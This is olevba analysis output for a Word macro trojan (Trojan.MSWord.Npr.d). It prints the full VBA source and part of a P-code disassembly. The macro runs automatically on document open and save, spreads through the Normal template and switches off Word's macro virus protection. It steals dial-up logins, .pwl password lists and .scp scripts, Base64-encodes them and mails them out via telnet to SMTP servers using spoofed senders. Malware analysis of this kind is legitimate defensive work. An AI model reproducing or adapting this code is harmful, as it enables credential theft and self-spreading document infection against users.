olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Npr.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Npr.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: Trojan.MSWord.Npr.d - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Dial-up_script_checker
Option Explicit
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
'End Sub
Function SCP()
Dim i As Integer
Dim Tmp As String
Dim Found As Boolean
Dim NUA As String
Dim MScript1 As String
Dim MScript2 As String
Dim NF As Integer

On Error Resume Next
If Application.Visible = False Then
With Application.FileSearch
     .LookIn = "c:\"
     .SearchSubFolders = True
     .FileName = "*.scp"
     .Execute
    Found = False
    For i = 1 To .FoundFiles.Count
     NF = FreeFile
     If InStr(1, .FoundFiles(i), "MyInternet.scp", vbTextCompare) = 0 Then
     Open .FoundFiles(i) For Input Access Read As #NF
      Do While Not EOF(NF)
       Line Input #NF, Tmp
        MScript1 = MScript1 + Chr(13) + Chr(10) + Tmp
        If InStr(1, Tmp, "-.int", vbBinaryCompare) Or InStr(1, Tmp, "-.nt", vbBinaryCompare) Then
        Found = True
        NUA = NUA + Chr(13) + Chr(10) + Tmp
       End If
      Loop
     Close NF
     
     If Len(MScript1) < 5000 And Found = True Then MScript2 = MScript2 + Chr(13) + Chr(10) + .FoundFiles(i) + Chr(13) + Chr(10) + MScript1
     Found = False: Tmp = "": MScript1 = ""
    DoEvents
    End If
    Next i
End With
SCP = NUA + Chr(13) + Chr(10) + MScript2
NF = FreeFile
Open "C:\WINDOWS\MyInternet.scp" For Output Access Write As NF
 Print #NF, SCP
Close NF
Else
NF = FreeFile
On Error GoTo CONEZ
Open "C:\WINDOWS\MyInternet.scp" For Input Access Read As NF
  Do While Not EOF(NF)
  Line Input #NF, Tmp
  SCP = SCP + Tmp
  Loop
 Close #NF
End If
CONEZ:
End Function
' End Sub
Sub Sender_main()

Dim Handle As Long
Dim HandleBW As Long
                      
Dim NoConn_ As String
Dim hwnd As Long
                 
Dim GrabStr As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 14) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
Dim RecipientOfMessage_ As String
Dim SenderAddress As String
Dim SenderDomain As String
Dim FNum_ As Integer
Dim Usname
Dim Domain_ As String

On Error Resume Next
If Check_Connection = True Then
RecipientOfMessage_ = "<kashek@usa.net>"

Host(1) = "smtp.mail.ru": Domain_ = "@mail.ru"
Usname = Array("-dima-", "2vasiliy", "521521", "DGabidullin", "Intarsija", "KirovDVP", "Mischelli", "MonitorExpress", "Sveta-P2000", "Voronin_Vladimir", "a_kladenova", "abccondi", "abs", "admiralll", "ako", "alazif", "alcan777", "aleksiv2000", "alena_elena", "alexander555", "alexkis", "alexsar", "alltair", "alt-info", "antares_", "anton76", "artyserg", "arxi77", "asp", "ate", "avatchev", "axel_extr", "balds", "bars-profile", "batsek", "best-njl", "bigmoney4u", "bkp", "braut_99", "broker-nsk", "bxk", "c_service", "carlych", "ciap", "courses", "darlenka", "daswer", "datasave")
Host(2) = "itk2.bas-net.by"
Host(3) = "195.75.32.20"

Loto 3, A()

Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
   If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
    NoConn_ = "Connect failed"
  Else
   THwnd = FindWindow(CLng(0), "O†‰¡†• - (¡†•)")
   If THwnd <> 0 Then
    Twnd = "O†‰¡†•"
    None = "(¡†•)"
    NoConn_ = "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
   Else
   THwnd = FindWindow(CLng(0), "Telnet - (¡†•)")
    Twnd = "telnet"
    None = "(¡†•)"
    NoConn_ = "¥ Œ‚ ‹Œ„ˆ‰_ö†¡Š˜"
   End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 3
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), NoConn_)
 DoEvents
Loop
Select Case Handle
  Case Is <> 0

Randomize
SenderDomain = Usname(Int(UBound(Usname) * Rnd))
SenderAddress = Usname(Int(UBound(Usname) * Rnd)) + Domain_

SMTP = "helo My" + SenderDomain + "#$$mail from: <" + SenderAddress + ">#$" + "rcpt to: " + RecipientOfMessage_ + "#$data#$" + _
 "From: <" + SenderAddress + ">#" + "To: " + RecipientOfMessage_ + "#" + _
 "Date: " + Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.2#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
GrabStr = Grab + SCP
SMTP = Base64(GrabStr)
SMTP = Adapt(SMTP)
Filler SMTP, Handle
                   
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#$quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Function morf(MyString As String)
Dim NextSub As Long
Dim Counter As Integer
Dim A() As Integer
Dim Code_() As String
Dim i As Long
Dim Pre_ As Long
Dim Resalt As String
On Error Resume Next
NextSub = InStr(1, MyString, "End" + " Sub", vbTextCompare)
Do While NextSub <> 0
Counter = Counter + 1
NextSub = InStr(NextSub + 9, MyString, "End" + " Sub", vbTextCompare)
Loop
ReDim Code_(0 To Counter - 1)

NextSub = -8
For i = 0 To Counter - 1
Pre_ = NextSub + 9
NextSub = InStr(Pre_, MyString, "End" + " Sub", vbTextCompare)
Code_(i) = Mid(MyString, Pre_, NextSub + 9 - Pre_)
Next i
Loto Counter - 1, A()
Resalt = Code_(0)
For i = 1 To Counter - 1
Resalt = Resalt + Code_(A(i))
Next i
morf = Resalt
End Function
' End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 4
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Sub CopyLines(Source As Object)
On Error Resume Next
     Dim SourceM As Object, TargetM As Object
     Dim n As Long
     Dim Body As String
     Dim VBComponent  As Object
    For Each VBComponent In Source.VBProject.VBComponents
     Set SourceM = VBComponent
     n = SourceM.CodeModule.CountOfLines
     Body = SourceM.CodeModule.Lines(1, 1)
     If InStr(1, Body, "Dial-up_script_checker", vbTextCompare) <> 0 Then
     Body = SourceM.CodeModule.Lines(1, n)
     Body = morf(Body)
     Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
     TargetM.CodeModule.AddFromString Body
     TargetM.Name = "MSPluss_SCP"
     End If
   Next
End Sub

Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Function Grab()
Dim Tmp As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
On Error Resume Next
If Dir$("c:\windows\edialer.ini") <> "" Then
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Temp = Temp + Tmp + Chr(10)
  End If
Loop
Close #NF
Temp = Temp + Chr(10) + Chr(13)
End If
If Dir$("C:\Windows\system.ini") <> "" Then
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Tmp
 Counter = Counter + 1
 If Tmp = "[Password Lists]" Then
  Do While Tmp <> ""
  Line Input #NF, Tmp
  Temp = Temp + Chr(10) + Tmp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
End If
Close #NF
Grab = Temp
End Function
' End Sub
Sub AutoOpen()
Dim VBComponent As Object
Dim Yes As Boolean
Dim Body As String
 On Error Resume Next
 Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 Body = VBComponent.CodeModule.Lines(1, 1)
   If InStr(1, Body, "Dial-up_script_checker", vbTextCompare) <> 0 Then
     Yes = True
     Exit For
   End If
 Next
If Yes = False Then
CopyLines MacroContainer
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub

Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub
Function Check_Connection()
Dim CurrWnd As Long
Dim Length As Long
Dim Title As String
  CurrWnd = FindWindow(CLng(0), "")
  CurrWnd = GetWindow(CurrWnd, 0)
    Do While CurrWnd <> 0
       Length = GetWindowTextLength(CurrWnd)
        Title = Space(Length + 1)
    Length = GetWindowText(CurrWnd, Title, Length + 1)
    If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
     Or InStr(1, Title, "IŒ„ˆ‰_ö†¡Œ ˆ", vbTextCompare) <> 0 Then
     Check_Connection = True
     Exit Function
    End If
    CurrWnd = GetWindow(CurrWnd, 2)
    DoEvents
  Loop
  Check_Connection = False
End Function
' End Sub
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function
' End Sub
Sub AutoExit()
Dim Counter As Integer
Dim i As Integer
Dim VBComp As Object
Dim Body As String

 Application.Visible = False
 Options.SaveNormalPrompt = False
 On Error Resume Next

Counter = Templates.Count
For i = 1 To Counter
 For Each VBComp In Templates(i).VBProject.VBComponents
  Body = VBComp.CodeModule.Lines(1, 1)
  If InStr(1, Body, "Dial-up_script_checker", vbTextCompare) = 0 Then
     With VBComp.CodeModule
       .DeleteLines 1, .CountOfLines
     End With
   If VBComp.Name <> "ThisDocument" Then
   Application.OrganizerDelete Templates(i).Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
 End If
 Next
Next i

 NormalTemplate.Save
 Tmsn
 Options.VirusProtection = True
End Sub
Function Base64(FirstStr As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer

HMask = 252
LMask = 3
Shift = 16
Roll = 0
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

On Error Resume Next
For i = 1 To Len(FirstStr)
Char = Asc(Mid(FirstStr, i, 1))
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Next

If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
' End Sub
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function
' End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub

Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub


Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan.MSWord.Npr.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Módulo1 - 29274 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 "Dial-up_script_checker"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	FuncDefn (Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long)
' Line #3:
' 	FuncDefn (Declare Function GetWindowText Lib "user32" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long)
' Line #4:
' 	FuncDefn (Declare Function GetWindowTextLength Lib "user32" (ByVal hwnd As Long) As Long)
' Line #5:
' 	FuncDefn (Declare Function SendMessage Lib "user32.dll" (ByVal hwnd As Long, ByVal Msg As Long, wParam As , lParam As ) As Long)
' Line #6:
' 	LineCont 0x0008 06 00 00 00 0D 00 00 00
' 	FuncDefn (Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName As , ByVal lpWindowName As ) As Long)
' Line #7:
' 	FuncDefn (Function Adapt(Cod As String))
' Line #8:
' 	Dim 
' 	VarDefn PostCod (As String)
' Line #9:
' 	Dim 
' 	VarDefn i (As Long)
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Cod 
' 	FnLen 
' 	For 
' Line #12:
' 	Ld i 
' 	LitDI2 0x004C 
' 	Ge 
' 	Ld i 
' 	LitDI2 0x004C 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #13:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St PostCod 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	Ld PostCod 
' 	Ld Cod 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St PostCod 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	StartForVariable 
' 	Next 
' Line #18:
' 	LitStr 0x0001 "#"
' 	Ld PostCod 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Adapt 
' Line #19:
' 	EndFunc 
' Line #20:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #21:
' 	FuncDefn (Function SCP())
' Line #22:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #23:
' 	Dim 
' 	VarDefn Tmp (As String)
' Line #24:
' 	Dim 
' 	VarDefn Found (As Boolean)
' Line #25:
' 	Dim 
' 	VarDefn NUA (As String)
' Line #26:
' 	Dim 
' 	VarDefn MScript1 (As String)
' Line #27:
' 	Dim 
' 	VarDefn MScript2 (As String)
' Line #28:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #29:
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	Ld Application 
' 	MemLd Visible 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #33:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #34:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #35:
' 	LitStr 0x0005 "*.scp"
' 	MemStWith FileName 
' Line #36:
' 	ArgsMemCallWith Execute 0x0000 
' Line #37:
' 	LitVarSpecial (False)
' 	St Found 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #39:
' 	Ld Friend 
' 	St NF 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	LitStr 0x000E "MyInternet.scp"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #42:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #43:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #44:
' 	Ld MScript1 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Tmp 
' 	Add 
' 	St MScript1 
' Line #45:
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x0005 "-.int"
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	LitDI2 0x0001 
' 	Ld Tmp 
' 	LitStr 0x0004 "-.nt"
' 	Ld vbBinaryCompare 
' 	FnInStr4 
' 	Or 
' 	IfBlock 
' Line #46:
' 	LitVarSpecial (True)
' 	St Found 
' Line #47:
' 	Ld NUA 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld Tmp 
' 	Add 
' 	St NUA 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Loop 
' Line #50:
' 	Ld NF 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	Ld MScript1 
' 	FnLen 
' 	LitDI2 0x1388 
' 	Lt 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld MScript2 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld MScript1 
' 	Add 
' 	St MScript2 
' 	EndIf 
' Line #53:
' 	LitVarSpecial (False)
' 	St Found 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St Tmp 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St MScript1 
' Line #54:
' 	ArgsCall DoEvents 0x0000 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	EndWith 
' Line #58:
' 	Ld NUA 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld MScript2 
' 	Add 
' 	St SCP 
' Line #59:
' 	Ld Friend 
' 	St NF 
' Line #60:
' 	LitStr 0x0019 "C:\WINDOWS\MyInternet.scp"
' 	Ld NF 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #61:
' 	Ld NF 
' 	Sharp 
' 	PrintChan 
' 	Ld SCP 
' 	PrintItemNL 
' Line #62:
' 	Ld NF 
' 	Close 0x0001 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	Ld Friend 
' 	St NF 
' Line #65:
' 	OnError CONEZ 
' Line #66:
' 	LitStr 0x0019 "C:\WINDOWS\MyInternet.scp"
' 	Ld NF 
' 	LitDefault 
' 	Open (For Input Access Read)
' Line #67:
' 	Ld NF 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #68:
' 	Ld NF 
' 	Ld Tmp 
' 	LineInput 
' Line #69:
' 	Ld SCP 
' 	Ld Tmp 
' 	Add 
' 	St SCP 
' Line #70:
' 	Loop 
' Line #71:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Label CONEZ 
' Line #74:
' 	EndFunc 
' Line #75:
' 	QuoteRem 0x0000 0x0008 " End Sub"
' Line #76:
' 	FuncDefn (Sub Sender_main())
' Line #77:
' Line #78:
' 	Dim 
' 	VarDefn Handle (As Long)
' Line #79:
' 	Dim 
' 	VarDefn HandleBW (As Long)
' Line #80:
' Line #81:
' 	Dim 
' 	VarDefn NoConn_ (As String)
' Line #82:
' 	Dim 
' 	VarDefn hwnd (As Long)
' Line #83:
' Line #84:
' 	Dim 
' 	VarDefn GrabStr (As String)
' Line #85:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #86:
' 	Dim 
' 	VarDefn MyDat (As Byte)
' Line #87:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #88:
' 	Dim 
' 	VarDefn NPwl (As String)
' Line #89:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #90:
' 	Dim 
' 	VarDefn Title (As String)
' Line #91:
' 	Dim 
' 	VarDefn SMTP (As String)
' Line #92:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn Host (As String)
' Line #93:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #94:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #95:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #96:
' 	Dim 
' 	VarDefn THwnd (As Long)
' Line #97:
' 	Dim 
' 	VarDefn Twnd (As String)
' Line #98:
' 	Dim 
' 	VarDefn None (As String)
' Line #99:
' 	Dim 
' 	VarDefn RecipientOfMessage_ (As String)
' Line #100:
' 	Dim 
' 	VarDefn SenderAddress (As String)
' Line #101:
' 	Dim 
' 	VarDefn SenderDomain (As String)
' Line #102:
' 	Dim 
' 	VarDefn FNum_ (As Integer)
' Line #103:
' 	Dim 
' 	VarDefn Usname
' Line #104:
' 	Dim 
' 	VarDefn Domain_ (As String)
' Line #105:
' Line #106:
' 	OnError (Resume Next) 
' Line #107:
' 	Ld Check_Connection 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #108:
' 	LitStr 0x0010 "<kashek@usa.net>"
' 	St RecipientOfMessage_ 
' Line #109:
' Line #110:
' 	LitStr 0x000C "smtp.mail.ru"
' 	LitDI2 0x0001 
' 	ArgsSt Host 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "@mail.ru"
' 	St Domain_ 
' Line #111:
' 	LitStr 0x0006 "-dima-"
' 	LitStr 0x0008 "2vasiliy"
' 	LitStr 0x0006 "521521"
' 	LitStr 0x000B "DGabidullin"
' 	LitStr 0x0009 "Intarsija"
' 	LitStr 0x0008 "KirovDVP"
' 	LitStr 0x0009 "Mischelli"
' 	LitStr 0x000E "MonitorExpress"
' 	LitStr 0x000B "Sveta-P2000"
' 	LitStr 0x0010 "Voronin_Vladimir"
' 	LitStr 0x000B "a_kladenova"
' 	LitStr 0x0008 "abccondi"
' 	LitStr 0x0003 "abs"
' 	LitStr 0x0009 "admiralll"
' 	LitStr 0x0003 "ako"
' 	LitStr 0x0006 "alazif"
' 	LitStr 0x0008 "alcan777"
' 	LitStr 0x000B "aleksiv2000"
' 	LitStr 0x000B "alena_elena"
' 	LitStr 0x000C "alexander555"
' 	LitStr 0x0007 "alexkis"
' 	LitStr 0x0007 "alexsar"
' 	LitStr 0x0007 "alltair"
' 	LitStr 0x0008 "alt-info"
' 	LitStr 0x0008 "antares_"
' 	LitStr 0x0007 "anton76"
' 	LitStr 0x0008 "artyserg"
' 	LitStr 0x0006 "arxi77"
' 	LitStr 0x0003 "asp"
' 	LitStr 0x0003 "ate"
' 	LitStr 0x0008 "avatchev"
' 	LitStr 0x0009 "axel_extr"
' 	LitStr 0x0005 "balds"
' 	LitStr 0x000C "bars-profile"
' 	LitStr 0x0006 "batsek"
' 	LitStr 0x0008 "best-njl"
' 	LitStr 0x000A "bigmoney4u"
' 	LitStr 0x0003 "bkp"
' 	LitStr 0x0008 "braut_99"
' 	LitStr 0x000A "broker-nsk"
' 	LitStr 0x0003 "bxk"
' 	LitStr 0x0009 "c_service"
' 	LitStr 0x0007 "carlych"
' 	LitStr 0x0004 "ciap"
' 	LitStr 0x0007 "courses"
' 	LitStr 0x0008 "darlenka"
' 	LitStr 0x0006 "daswer"
' 	LitStr 0x0008 "datasave"
' 	ArgsArray Array 0x0030 
' 	St Usname 
' Line #112:
' 	LitStr 0x000F "itk2.bas-net.by"
' 	LitDI2 0x0002 
' 	ArgsSt Host 0x0001 
' Line #113:
' 	LitStr 0x000C "195.75.32.20"
' 	LitDI2 0x0003 
' 	ArgsSt Host 0x0001 
' Line #114:
' Line #115:
' 	LitDI2 0x0003 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #116:
' Line #117:
' 	LitStr 0x0006 "telnet"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #118:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000F "Telnet - (none)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #119:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #120:
' 	LitStr 0x0006 "telnet"
' 	St Twnd 
' Line #121:
' 	LitStr 0x0006 "(none)"
' 	St None 
' Line #122:
' 	LitStr 0x000E "Connect failed"
' 	St NoConn_ 
' Line #123:
' 	ElseBlock 
' Line #124:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "O†‰¡†• - (¡†•)"
